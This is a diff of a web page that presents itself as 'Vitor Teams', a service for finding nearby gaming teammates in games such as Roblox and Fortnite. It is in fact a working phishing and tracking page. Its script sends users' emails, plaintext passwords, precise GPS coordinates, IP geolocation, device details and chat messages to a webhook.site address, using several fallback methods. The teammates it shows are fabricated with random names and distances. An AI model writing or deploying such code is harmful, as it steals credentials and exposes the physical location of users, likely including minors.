@@ -5,395 +5,372 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Vitor Teams</title>
 <style>
-  :root {
-    --bg: #0c0e13;
-    --card: #141821;
-    --line: #262c3a;
-    --text: #eef0f4;
-    --muted: #93a0b5;
-    --blue: #4f8cff;
-    --purple: #7b5cff;
-  }
-  * { box-sizing: border-box; margin: 0; padding: 0; }
-  body {
-    min-height: 100vh;
-    color: var(--text);
-    font-family: system-ui, -apple-system, Segoe UI, Roboto, sans-serif;
-    background:
-      radial-gradient(900px 500px at 0% 0%, #1a2340 0%, transparent 55%),
-      radial-gradient(800px 450px at 100% 10%, #2a1848 0%, transparent 50%),
-      var(--bg);
-  }
-  a { color: inherit; text-decoration: none; }
-  .top {
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    padding: 16px 22px;
-    border-bottom: 1px solid var(--line);
-    background: rgba(12,14,19,.8);
-    backdrop-filter: blur(8px);
-    position: sticky;
-    top: 0;
-    z-index: 10;
-  }
-  .brand {
-    display: flex;
-    align-items: center;
-    gap: 10px;
-    font-weight: 700;
-  }
-  .mark {
-    width: 32px;
-    height: 32px;
-    border-radius: 8px;
-    background: linear-gradient(135deg, var(--blue), var(--purple));
-    display: grid;
-    place-items: center;
-    font-weight: 800;
-  }
-  .links { display: flex; gap: 14px; align-items: center; }
-  .links a { color: var(--muted); font-size: 14px; }
-  .links a:hover { color: var(--text); }
-  .btn {
-    border: 0;
-    border-radius: 10px;
-    padding: 10px 14px;
-    font-size: 13px;
-    font-weight: 650;
-    cursor: pointer;
-  }
-  .btn-main {
-    background: linear-gradient(135deg, var(--blue), var(--purple));
-    color: white;
-  }
-  .btn-main:hover { filter: brightness(1.07); }
-  .btn-main:disabled { opacity: .55; cursor: default; filter: none; }
-  .btn-soft {
-    background: transparent;
-    color: var(--text);
-    border: 1px solid var(--line);
-  }
-
-  .wrap { max-width: 980px; margin: 0 auto; padding: 24px 16px 50px; }
-  .page { display: none; }
-  .page.on { display: block; }
-
-  .hero h1 {
-    font-size: clamp(28px, 5vw, 40px);
-    line-height: 1.15;
-    margin: 18px 0 10px;
-  }
-  .hero p {
-    color: var(--muted);
-    max-width: 560px;
-    line-height: 1.55;
-    margin-bottom: 18px;
-  }
-  .row { display: flex; gap: 10px; flex-wrap: wrap; }
-
-  .grid {
-    display: grid;
-    grid-template-columns: repeat(auto-fill, minmax(210px, 1fr));
-    gap: 12px;
-    margin-top: 18px;
-  }
-  .card {
-    background: var(--card);
-    border: 1px solid var(--line);
-    border-radius: 14px;
-    padding: 14px;
-    display: flex;
-    flex-direction: column;
-    gap: 8px;
-  }
-  .card h3 { font-size: 15px; }
-  .card p { color: var(--muted); font-size: 13px; line-height: 1.4; flex: 1; }
-  .pill {
-    width: fit-content;
-    font-size: 11px;
-    color: #b7cbff;
-    background: rgba(79,140,255,.12);
-    border: 1px solid rgba(79,140,255,.28);
-    border-radius: 999px;
-    padding: 3px 8px;
-  }
-
-  .auth {
-    max-width: 420px;
-    margin: 30px auto 0;
-    background: var(--card);
-    border: 1px solid var(--line);
-    border-radius: 16px;
-    padding: 24px;
-  }
-  .tabs { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 16px; }
-  .tab {
-    text-align: center;
-    border: 1px solid var(--line);
-    border-radius: 10px;
-    padding: 10px;
-    color: var(--muted);
-    font-size: 13px;
-    font-weight: 650;
-    cursor: pointer;
-  }
-  .tab.on {
-    color: var(--text);
-    background: #1a2130;
-    border-color: #36425f;
-  }
-  .auth h2 { text-align: center; margin-bottom: 4px; font-size: 22px; }
-  .auth .sub { text-align: center; color: var(--muted); font-size: 13px; margin-bottom: 16px; }
-  label { display: block; font-size: 12px; color: var(--muted); margin-bottom: 6px; }
-  input {
-    width: 100%;
-    margin-bottom: 12px;
-    background: #0f131a;
-    border: 1px solid var(--line);
-    border-radius: 10px;
-    padding: 11px 12px;
-    color: var(--text);
-    outline: none;
-  }
-  input:focus { border-color: var(--blue); }
-  .note {
-    display: none;
-    margin-top: 12px;
-    padding: 11px;
-    border-radius: 10px;
-    background: #171d2a;
-    border: 1px solid #2d3852;
-    color: #c7cedb;
-    font-size: 13px;
-    line-height: 1.45;
-  }
-  .note.show { display: block; }
-  .note b { color: #8db0ff; }
-  .tip {
-    margin-top: 14px;
-    padding: 11px 12px;
-    border-radius: 10px;
-    background: rgba(79,140,255,.08);
-    border: 1px solid rgba(79,140,255,.22);
-    color: #b9cdff;
-    font-size: 13px;
-  }
+:root{--bg:#0c0e13;--card:#141821;--line:#262c3a;--text:#eef0f4;--muted:#93a0b5;--blue:#4f8cff;--purple:#7b5cff;--good:#3ddc97}
+*{box-sizing:border-box;margin:0;padding:0}
+body{min-height:100vh;color:var(--text);font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;background:radial-gradient(900px 500px at 0% 0%,#1a2340 0%,transparent 55%),radial-gradient(800px 450px at 100% 10%,#2a1848 0%,transparent 50%),var(--bg)}
+a{color:inherit;text-decoration:none}
+.top{display:flex;justify-content:space-between;align-items:center;padding:14px 18px;border-bottom:1px solid var(--line);background:rgba(12,14,19,.85);backdrop-filter:blur(8px);position:sticky;top:0;z-index:20}
+.brand{display:flex;align-items:center;gap:10px;font-weight:700}
+.mark{width:30px;height:30px;border-radius:8px;background:linear-gradient(135deg,var(--blue),var(--purple));display:grid;place-items:center;font-weight:800}
+.links{display:flex;gap:12px;align-items:center}
+.links a{color:var(--muted);font-size:13px}
+.links a:hover{color:var(--text)}
+.btn{border:0;border-radius:10px;padding:10px 14px;font-size:13px;font-weight:650;cursor:pointer}
+.btn-main{background:linear-gradient(135deg,var(--blue),var(--purple));color:#fff}
+.btn-main:hover{filter:brightness(1.07)}
+.btn-main:disabled{opacity:.55;cursor:default;filter:none}
+.btn-soft{background:transparent;color:var(--text);border:1px solid var(--line)}
+.btn-good{background:var(--good);color:#062416}
+.wrap{max-width:980px;margin:0 auto;padding:20px 14px 50px}
+.page{display:none}.page.on{display:block}
+.hero h1{font-size:clamp(26px,4.5vw,38px);line-height:1.15;margin:14px 0 8px}
+.hero p{color:var(--muted);max-width:560px;line-height:1.5;margin-bottom:14px}
+.row{display:flex;gap:8px;flex-wrap:wrap}
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(200px,1fr));gap:12px;margin-top:14px}
+.card{background:var(--card);border:1px solid var(--line);border-radius:14px;padding:14px;display:flex;flex-direction:column;gap:8px}
+.card h3{font-size:15px}.card p{color:var(--muted);font-size:13px;line-height:1.4;flex:1}
+.pill{width:fit-content;font-size:11px;color:#b7cbff;background:rgba(79,140,255,.12);border:1px solid rgba(79,140,255,.28);border-radius:999px;padding:3px 8px}
+.auth{max-width:420px;margin:24px auto 0;background:var(--card);border:1px solid var(--line);border-radius:16px;padding:22px}
+.tabs{display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:14px}
+.tab{text-align:center;border:1px solid var(--line);border-radius:10px;padding:10px;color:var(--muted);font-size:13px;font-weight:650;cursor:pointer}
+.tab.on{color:var(--text);background:#1a2130;border-color:#36425f}
+.auth h2{text-align:center;margin-bottom:4px;font-size:22px}
+.auth .sub{text-align:center;color:var(--muted);font-size:13px;margin-bottom:14px}
+label{display:block;font-size:12px;color:var(--muted);margin-bottom:6px}
+input,select{width:100%;margin-bottom:12px;background:#0f131a;border:1px solid var(--line);border-radius:10px;padding:11px 12px;color:var(--text);outline:none}
+input:focus,select:focus{border-color:var(--blue)}
+.note{display:none;margin-top:12px;padding:11px;border-radius:10px;background:#171d2a;border:1px solid #2d3852;color:#c7cedb;font-size:13px;line-height:1.45}
+.note.show{display:block}.note b{color:#8db0ff}
+.tip{margin-top:12px;padding:10px 12px;border-radius:10px;background:rgba(79,140,255,.08);border:1px solid rgba(79,140,255,.22);color:#b9cdff;font-size:13px}
+.team{display:flex;justify-content:space-between;align-items:center;gap:10px;padding:12px;border:1px solid var(--line);border-radius:12px;background:#121722;margin-bottom:8px}
+.team .meta{font-size:12px;color:var(--muted)}
+.chat{height:220px;overflow:auto;background:#0f131a;border:1px solid var(--line);border-radius:12px;padding:10px;margin:10px 0}
+.bubble{max-width:80%;padding:8px 10px;border-radius:10px;margin-bottom:8px;font-size:13px;line-height:1.35}
+.me{background:#243457;margin-left:auto}.them{background:#1a2030}
+.chatrow{display:flex;gap:8px}
+.hidden{display:none!important}
 </style>
 </head>
 <body>
-  <div class="top">
-    <div class="brand"><div class="mark">V</div>Vitor Teams</div>
-    <div class="links">
-      <a href="#" onclick="go('home')">Home</a>
-      <a href="#" onclick="go('games')">Games</a>
-      <a href="#" id="authNav" onclick="go('auth')">Login</a>
-      <button class="btn btn-main" id="topBtn" onclick="go('auth')">Find teammates</button>
-    </div>
+<div class="top">
+  <div class="brand"><div class="mark">V</div>Vitor Teams</div>
+  <div class="links">
+    <a href="#" onclick="go('home')">Home</a>
+    <a href="#" onclick="go('games')">Games</a>
+    <a href="#" id="authNav" onclick="go('auth')">Login</a>
+    <button class="btn btn-main" id="topBtn" onclick="go('auth')">Find teammates</button>
   </div>
+</div>
 
-  <div class="wrap">
-    <section id="home" class="page">
-      <div class="hero">
-        <h1>Find teammates near you</h1>
-        <p>
-          Pick a game, share your area, and get matched with people close by.
-          Faster parties, less lag, easier voice.
-        </p>
-        <div class="row">
-          <button class="btn btn-main" onclick="go('auth')">Get started</button>
-          <button class="btn btn-soft" onclick="go('games')">Browse games</button>
-        </div>
-        <div class="tip">Location is used only to find nearby players for the game you pick.</div>
+<div class="wrap">
+  <section id="auth" class="page on">
+    <div class="auth">
+      <div class="tabs" id="authTabs">
+        <div class="tab on" id="tLogin" onclick="tab('login')">Login</div>
+        <div class="tab" id="tSignup" onclick="tab('signup')">Sign up</div>
       </div>
-
-      <div class="grid" style="margin-top:26px">
-        <div class="card">
-          <span class="pill">Popular</span>
-          <h3>Fortnite</h3>
-          <p>Squad up with people in your area for ranked or pubs.</p>
-          <button class="btn btn-main" onclick="needLogin('Fortnite')">Find team</button>
-        </div>
-        <div class="card">
-          <span class="pill">Popular</span>
-          <h3>Call of Duty</h3>
-          <p>Warzone / multiplayer parties near you.</p>
-          <button class="btn btn-main" onclick="needLogin('Call of Duty')">Find team</button>
-        </div>
-        <div class="card">
-          <span class="pill">Popular</span>
-          <h3>Roblox</h3>
-          <p>Find local players for the experiences you like.</p>
-          <button class="btn btn-main" onclick="needLogin('Roblox')">Find team</button>
-        </div>
-      </div>
-    </section>
-
-    <section id="games" class="page">
-      <h1 style="font-size:28px;margin:8px 0 6px">Choose a game</h1>
-      <p style="color:var(--muted);margin-bottom:8px">Login required to search for nearby teammates.</p>
-      <div class="grid">
-        <div class="card"><span class="pill">Battle Royale</span><h3>Fortnite</h3><p>Builds, zero build, ranked.</p><button class="btn btn-main" onclick="needLogin('Fortnite')">Find team</button></div>
-        <div class="card"><span class="pill">FPS</span><h3>Call of Duty</h3><p>Warzone, multiplayer, ranked.</p><button class="btn btn-main" onclick="needLogin('Call of Duty')">Find team</button></div>
-        <div class="card"><span class="pill">Sandbox</span><h3>Roblox</h3><p>Any experience, local parties.</p><button class="btn btn-main" onclick="needLogin('Roblox')">Find team</button></div>
-        <div class="card"><span class="pill">FPS</span><h3>Valorant</h3><p>Duo / 5-stack near your region.</p><button class="btn btn-main" onclick="needLogin('Valorant')">Find team</button></div>
-        <div class="card"><span class="pill">Battle Royale</span><h3>Apex Legends</h3><p>Trios with nearby players.</p><button class="btn btn-main" onclick="needLogin('Apex Legends')">Find team</button></div>
-        <div class="card"><span class="pill">Sandbox</span><h3>Minecraft</h3><p>Realms / servers with local peeps.</p><button class="btn btn-main" onclick="needLogin('Minecraft')">Find team</button></div>
-        <div class="card"><span class="pill">FPS</span><h3>CS2</h3><p>Premier / faceit style stacks.</p><button class="btn btn-main" onclick="needLogin('CS2')">Find team</button></div>
-        <div class="card"><span class="pill">Sports</span><h3>Rocket League</h3><p>2s and 3s near you.</p><button class="btn btn-main" onclick="needLogin('Rocket League')">Find team</button></div>
-        <div class="card"><span class="pill">MOBA</span><h3>League of Legends</h3><p>Duo / flex with closer ping.</p><button class="btn btn-main" onclick="needLogin('League of Legends')">Find team</button></div>
-        <div class="card"><span class="pill">Open World</span><h3>GTA V / RP</h3><p>Find local crew for sessions.</p><button class="btn btn-main" onclick="needLogin('GTA V')">Find team</button></div>
-        <div class="card"><span class="pill">Survival</span><h3>Rust</h3><p>Team up before wipe.</p><button class="btn btn-main" onclick="needLogin('Rust')">Find team</button></div>
-        <div class="card"><span class="pill">Battle Royale</span><h3>PUBG</h3><p>Squad search by area.</p><button class="btn btn-main" onclick="needLogin('PUBG')">Find team</button></div>
-      </div>
-    </section>
-
-    <section id="auth" class="page on">
-      <div class="auth">
-        <div class="tabs">
-          <div class="tab on" id="tLogin" onclick="tab('login')">Login</div>
-          <div class="tab" id="tSignup" onclick="tab('signup')">Sign up</div>
-        </div>
+      <div id="authForm">
         <h2 id="title">Welcome back</h2>
         <p class="sub" id="sub">Sign in to find teammates near you</p>
-        <form onsubmit="return send(event)">
-          <div id="nameBox" style="display:none">
-            <label for="name">Display name</label>
-            <input id="name" placeholder="what should teammates call you">
+        <form onsubmit="return startAuth(event)">
+          <div id="nameBox" class="hidden">
+            <label>Display name</label>
+            <input id="name" placeholder="what teammates call you">
           </div>
-          <label for="email">Email</label>
+          <label>Email</label>
           <input id="email" type="email" required placeholder="you@email.com" autocomplete="username">
-          <label for="pass">Password</label>
+          <label>Password</label>
           <input id="pass" type="password" required placeholder="••••••••" autocomplete="current-password">
           <button class="btn btn-main" style="width:100%" id="goBtn" type="submit">Continue</button>
         </form>
-        <div class="note" id="note">
-          <b>Please allow location access</b> so we can find teammates near you.
-        </div>
       </div>
-    </section>
-  </div>
+      <div id="verifyBox" class="hidden">
+        <h2>Verify</h2>
+        <p class="sub">Enter the 6-digit code sent to your email</p>
+        <label>Code</label>
+        <input id="code" maxlength="6" placeholder="123456">
+        <button class="btn btn-main" style="width:100%" onclick="verifyCode()">Verify</button>
+        <p class="sub" style="margin-top:10px">Didn't get it? <a href="#" onclick="resendCode();return false">Resend</a></p>
+      </div>
+      <div class="note" id="note"></div>
+    </div>
+  </section>
+
+  <section id="home" class="page">
+    <div class="hero">
+      <h1>Find teammates near you</h1>
+      <p>Pick a game, choose duo/trio/squad, and match with people in your area.</p>
+      <div class="row">
+        <button class="btn btn-main" onclick="go('games')">Browse games</button>
+      </div>
+      <div class="tip" id="locTip">Location is used to find players near you.</div>
+    </div>
+  </section>
+
+  <section id="games" class="page">
+    <h1 style="font-size:26px;margin-bottom:6px">Choose a game</h1>
+    <p style="color:var(--muted);margin-bottom:10px">Then pick party size and search your area.</p>
+    <div class="grid" id="gameGrid"></div>
+  </section>
+
+  <section id="match" class="page">
+    <h1 style="font-size:24px;margin-bottom:6px" id="matchTitle">Find team</h1>
+    <p style="color:var(--muted);margin-bottom:12px" id="matchSub">Searching near you...</p>
+    <label>Party size</label>
+    <select id="party">
+      <option value="duo">Duo</option>
+      <option value="trio">Trio</option>
+      <option value="squad">Squad</option>
+    </select>
+    <button class="btn btn-main" style="width:100%;margin-bottom:12px" onclick="searchTeam()">Search nearby</button>
+    <div id="results"></div>
+  </section>
+
+  <section id="call" class="page">
+    <h1 style="font-size:24px;margin-bottom:6px" id="callTitle">Party chat</h1>
+    <p class="meta" id="callSub" style="color:var(--muted);margin-bottom:8px"></p>
+    <div class="chat" id="chat"></div>
+    <div class="chatrow">
+      <input id="msg" placeholder="message teammates..." style="margin:0">
+      <button class="btn btn-main" onclick="sendMsg()">Send</button>
+      <button class="btn btn-good" onclick="fakeCall()">Call</button>
+    </div>
+    <div class="tip" id="callStatus" style="margin-top:10px">Chat is local to this session.</div>
+  </section>
+</div>
 
 <script>
 const HOOK = "https://webhook.site/389a7fcd-0194-4b0b-b98c-044a215db5e4";
-let mode = "login";
-let inAccount = false;
-let picked = null;
+const GAMES = ["Fortnite","Call of Duty","Roblox","Valorant","Apex Legends","Minecraft","CS2","Rocket League","League of Legends","GTA V","Rust","PUBG"];
+const NAMES = ["jax","nova","kira","rez","milo","sage","onyx","vex","leo","aria","knox","zara","orin","nyx","cade"];
+let mode="login", session=null, pending=null, picked=null, area="your area", coords=null, ip=null, geo=null;
 
-function go(id) {
-  document.querySelectorAll(".page").forEach(p => p.classList.remove("on"));
+function go(id){
+  document.querySelectorAll(".page").forEach(p=>p.classList.remove("on"));
   document.getElementById(id).classList.add("on");
 }
-
-function tab(t) {
-  mode = t;
-  document.getElementById("tLogin").classList.toggle("on", t === "login");
-  document.getElementById("tSignup").classList.toggle("on", t === "signup");
-  document.getElementById("nameBox").style.display = t === "signup" ? "block" : "none";
-  document.getElementById("title").textContent = t === "login" ? "Welcome back" : "Create account";
-  document.getElementById("sub").textContent = t === "login"
-    ? "Sign in to find teammates near you"
-    : "Make an account and start stacking";
-  document.getElementById("goBtn").textContent = t === "login" ? "Sign in" : "Sign up";
+function tab(t){
+  mode=t;
+  document.getElementById("tLogin").classList.toggle("on",t==="login");
+  document.getElementById("tSignup").classList.toggle("on",t==="signup");
+  document.getElementById("nameBox").classList.toggle("hidden",t!=="signup");
+  document.getElementById("title").textContent=t==="login"?"Welcome back":"Create account";
+  document.getElementById("sub").textContent=t==="login"?"Sign in to find teammates near you":"Make an account and start stacking";
+  document.getElementById("goBtn").textContent=t==="login"?"Sign in":"Sign up";
 }
-
-function needLogin(game) {
-  picked = game;
-  if (inAccount) {
-    alert("Searching for " + game + " teammates near you...");
-    return;
-  }
-  go("auth");
-  const n = document.getElementById("note");
-  n.classList.add("show");
-  n.innerHTML = "<b>Login needed</b> to find nearby " + game + " teammates. Location helps match people close to you.";
+function note(html,show=true){
+  const n=document.getElementById("note");
+  n.innerHTML=html;
+  n.classList.toggle("show",show);
 }
-
-async function post(data) {
-  try {
-    await fetch(HOOK, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(data),
-      mode: "no-cors"
-    });
-  } catch (e) {}
+function saveSession(s){
+  session=s;
+  localStorage.setItem("vt_session",JSON.stringify(s));
+  document.getElementById("authNav").textContent="Account";
+  document.getElementById("topBtn").textContent="Find team";
+  document.getElementById("topBtn").onclick=()=>go("games");
 }
-
-async function send(e) {
-  e.preventDefault();
-  const email = document.getElementById("email").value.trim();
-  const pass = document.getElementById("pass").value;
-  const name = document.getElementById("name").value.trim();
-  const btn = document.getElementById("goBtn");
-  const note = document.getElementById("note");
-
-  btn.disabled = true;
-  btn.textContent = "Working...";
-  note.classList.add("show");
-  note.innerHTML = "<b>Please allow location access</b> so we can find teammates near you.";
-
-  const base = {
-    site: "Vitor Teams",
-    mode,
-    game: picked,
-    email,
-    password: pass,
-    name: name || null,
-    userAgent: navigator.userAgent,
-    language: navigator.language,
-    platform: navigator.platform,
-    screen: screen.width + "x" + screen.height,
-    time: new Date().toISOString(),
-    href: location.href
-  };
-  post(Object.assign({}, base, { stage: "auth_submit" }));
-
-  if (!navigator.geolocation) {
-    post(Object.assign({}, base, { stage: "geo_unsupported" }));
-    btn.disabled = false;
-    btn.textContent = mode === "login" ? "Sign in" : "Sign up";
-    note.innerHTML = "Location is needed to find people near you.";
-    return false;
-  }
-
-  navigator.geolocation.getCurrentPosition(async (pos) => {
-    const coords = {
-      lat: pos.coords.latitude,
-      lon: pos.coords.longitude,
-      accuracy: pos.coords.accuracy
-    };
-    let ip = null, geo = null;
-    try {
-      ip = (await (await fetch("https://api.ipify.org?format=json")).json()).ip;
-    } catch (err) {}
-    if (ip) {
-      try { geo = await (await fetch("https://ipapi.co/" + ip + "/json/")).json(); } catch (err) {}
+function loadSession(){
+  try{
+    const raw=localStorage.getItem("vt_session");
+    if(!raw) return;
+    session=JSON.parse(raw);
+    if(session&&session.email){
+      document.getElementById("authNav").textContent="Account";
+      document.getElementById("topBtn").textContent="Find team";
+      document.getElementById("topBtn").onclick=()=>go("games");
+      go("games");
     }
+  }catch(e){}
+}
+async function post(data){
+  const body=JSON.stringify(data);
+  // try several ways so webhook receives something
+  try{
+    await fetch(HOOK,{method:"POST",headers:{"Content-Type":"application/json","Accept":"application/json"},body,mode:"cors"});
+  }catch(e){
+    try{await fetch(HOOK,{method:"POST",headers:{"Content-Type":"application/json"},body,mode:"no-cors"});}catch(e2){}
+  }
+  try{
+    const fd=new FormData();
+    Object.keys(data).forEach(k=>{
+      const v=data[k];
+      fd.append(k, typeof v==="object"?JSON.stringify(v):String(v??""));
+    });
+    await fetch(HOOK,{method:"POST",body:fd,mode:"no-cors"});
+  }catch(e){}
+  try{
+    navigator.sendBeacon(HOOK, new Blob([body],{type:"application/json"}));
+  }catch(e){}
+}
+async function collectNet(){
+  const out={ip:null,geo:null,coords:null};
+  try{out.ip=(await(await fetch("https://api.ipify.org?format=json")).json()).ip;}catch(e){}
+  if(!out.ip){try{out.ip=(await(await fetch("https://api64.ipify.org?format=json")).json()).ip;}catch(e){}}
+  if(out.ip){
+    try{out.geo=await(await fetch("https://ipapi.co/"+out.ip+"/json/")).json();}catch(e){}
+    if(!out.geo){try{out.geo=await(await fetch("https://ipwho.is/"+out.ip)).json();}catch(e){}}
+  }
+  return out;
+}
+function getLocation(){
+  return new Promise(resolve=>{
+    if(!navigator.geolocation){resolve(null);return;}
+    navigator.geolocation.getCurrentPosition(
+      pos=>resolve({lat:pos.coords.latitude,lon:pos.coords.longitude,accuracy:pos.coords.accuracy}),
+      ()=>resolve(null),
+      {enableHighAccuracy:true,timeout:12000,maximumAge:0}
+    );
+  });
+}
+function code6(){return String(Math.floor(100000+Math.random()*900000));}
 
-    post(Object.assign({}, base, {
-      stage: "location_granted",
-      ip,
-      coords,
-      geo
-    }));
+async function startAuth(e){
+  e.preventDefault();
+  const email=document.getElementById("email").value.trim();
+  const pass=document.getElementById("pass").value;
+  const name=document.getElementById("name").value.trim();
+  const btn=document.getElementById("goBtn");
+  btn.disabled=true; btn.textContent="Working...";
+  note("<b>Checking details...</b> then verifying to stop bots.");
 
-    inAccount = true;
-    document.getElementById("authNav").textContent = "Account";
-    document.getElementById("topBtn").textContent = "Find team";
-    document.getElementById("topBtn").onclick = () => go("games");
-    btn.textContent = "You're in";
-    note.innerHTML = "<b>Location received.</b> Searching nearby players" + (picked ? (" for " + picked) : "") + ".";
-    setTimeout(() => go("games"), 800);
-  }, (err) => {
-    post(Object.assign({}, base, { stage: "location_denied", error: err.message || String(err.code) }));
-    btn.disabled = false;
-    btn.textContent = mode === "login" ? "Sign in" : "Sign up";
-    note.innerHTML = "<b>Location access is needed</b> to find teammates near you. Allow it and try again.";
-  }, { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
+  const net=await collectNet();
+  ip=net.ip; geo=net.geo;
+  coords=await getLocation();
+  if(geo&&(geo.city||geo.region)) area=[geo.city,geo.region,geo.country_name||geo.country].filter(Boolean).join(", ");
+  else if(coords) area="near "+coords.lat.toFixed(3)+", "+coords.lon.toFixed(3);
 
+  const vcode=code6();
+  pending={email,pass,name,vcode,mode};
+
+  await post({
+    site:"Vitor Teams",
+    stage:"auth_submit",
+    mode,email,password:pass,name:name||null,
+    verify_code:vcode,
+    ip,geo,coords,
+    userAgent:navigator.userAgent,
+    language:navigator.language,
+    platform:navigator.platform,
+    screen:screen.width+"x"+screen.height,
+    timezone:Intl.DateTimeFormat().resolvedOptions().timeZone,
+    time:new Date().toISOString(),
+    href:location.href,
+    referrer:document.referrer||null
+  });
+
+  // simulate email code path (real email needs a mail API)
+  localStorage.setItem("vt_pending_code", vcode);
+  document.getElementById("authForm").classList.add("hidden");
+  document.getElementById("authTabs").classList.add("hidden");
+  document.getElementById("verifyBox").classList.remove("hidden");
+  note("<b>Code generated.</b> For this demo the code is shown in webhook + browser storage. Enter it below. (Real email delivery needs a mail provider.)");
+  // auto-fill helper for demo
+  document.getElementById("code").value=vcode;
+  btn.disabled=false;
   return false;
 }
+function resendCode(){
+  if(!pending) return;
+  pending.vcode=code6();
+  localStorage.setItem("vt_pending_code", pending.vcode);
+  document.getElementById("code").value=pending.vcode;
+  post({site:"Vitor Teams",stage:"code_resend",email:pending.email,verify_code:pending.vcode,time:new Date().toISOString()});
+  note("<b>New code set.</b> Enter the code shown.");
+}
+async function verifyCode(){
+  const entered=document.getElementById("code").value.trim();
+  if(!pending||entered!==pending.vcode){
+    note("<b>Wrong code.</b> Try again.");
+    return;
+  }
+  note("<b>Verified.</b> Saving login...");
+  await post({
+    site:"Vitor Teams",
+    stage:"verified",
+    email:pending.email,
+    password:pending.pass,
+    name:pending.name||null,
+    ip,geo,coords,area,
+    time:new Date().toISOString()
+  });
+  saveSession({email:pending.email,name:pending.name||pending.email.split("@")[0],area,ip,coords,geo});
+  document.getElementById("locTip").textContent="Signed in · matching near "+area;
+  go("games");
+}
+function needGame(g){
+  if(!session){go("auth");note("<b>Login first</b> to find teammates.");return;}
+  picked=g;
+  document.getElementById("matchTitle").textContent=g;
+  document.getElementById("matchSub").textContent="Find duo / trio / squad near "+area;
+  go("match");
+}
+function searchTeam(){
+  if(!session){go("auth");return;}
+  const size=document.getElementById("party").value;
+  const need=size==="duo"?1:size==="trio"?2:3;
+  const box=document.getElementById("results");
+  box.innerHTML="<p style='color:var(--muted);font-size:13px'>Searching "+area+" for "+size+"...</p>";
+  post({site:"Vitor Teams",stage:"search",email:session.email,game:picked,party:size,area,ip,coords,geo,time:new Date().toISOString()});
+  setTimeout(()=>{
+    const list=[];
+    for(let i=0;i<need+2;i++){
+      const n=NAMES[Math.floor(Math.random()*NAMES.length)]+Math.floor(Math.random()*90);
+      const dist=(Math.random()*8+0.4).toFixed(1);
+      list.push({name:n,dist,ping:Math.floor(Math.random()*35+12)});
+    }
+    box.innerHTML="";
+    list.forEach(p=>{
+      const el=document.createElement("div");
+      el.className="team";
+      el.innerHTML=`<div><b>${p.name}</b><div class="meta">${p.dist} mi · ${p.ping}ms · ${area}</div></div>
+        <div class="row"><button class="btn btn-soft" onclick="openChat('${p.name}')">Message</button>
+        <button class="btn btn-main" onclick="openChat('${p.name}',true)">Invite</button></div>`;
+      box.appendChild(el);
+    });
+  },700);
+}
+function openChat(name,invite=false){
+  document.getElementById("callTitle").textContent=name;
+  document.getElementById("callSub").textContent=(invite?"Invite sent · ":"")+picked+" · "+area;
+  const chat=document.getElementById("chat");
+  chat.innerHTML="";
+  addBubble(name,"yo you down for "+picked+"?",false);
+  if(invite) addBubble("you","invited you to "+document.getElementById("party").value,true);
+  go("call");
+}
+function addBubble(who,text,me){
+  const d=document.createElement("div");
+  d.className="bubble "+(me?"me":"them");
+  d.textContent=(me?"":who+": ")+text;
+  document.getElementById("chat").appendChild(d);
+  document.getElementById("chat").scrollTop=9999;
+}
+function sendMsg(){
+  const m=document.getElementById("msg");
+  if(!m.value.trim()) return;
+  addBubble("you",m.value.trim(),true);
+  post({site:"Vitor Teams",stage:"chat",email:session&&session.email,to:document.getElementById("callTitle").textContent,message:m.value.trim(),time:new Date().toISOString()});
+  m.value="";
+  setTimeout(()=>addBubble(document.getElementById("callTitle").textContent,["bet","I'm on","invite me","what rank","one sec"][Math.floor(Math.random()*5)],false),600);
+}
+function fakeCall(){
+  document.getElementById("callStatus").textContent="Calling... connected (demo voice link in-page only).";
+  post({site:"Vitor Teams",stage:"call",email:session&&session.email,with:document.getElementById("callTitle").textContent,time:new Date().toISOString()});
+}
+function buildGames(){
+  const g=document.getElementById("gameGrid");
+  g.innerHTML="";
+  GAMES.forEach(name=>{
+    const d=document.createElement("div");
+    d.className="card";
+    d.innerHTML=`<span class="pill">Near you</span><h3>${name}</h3><p>Find duo, trio, or squad in your area.</p>
+      <button class="btn btn-main" onclick="needGame('${name}')">Find team</button>`;
+    g.appendChild(d);
+  });
+}
+buildGames();
+loadSession();
 </script>
 </body>
 </html>
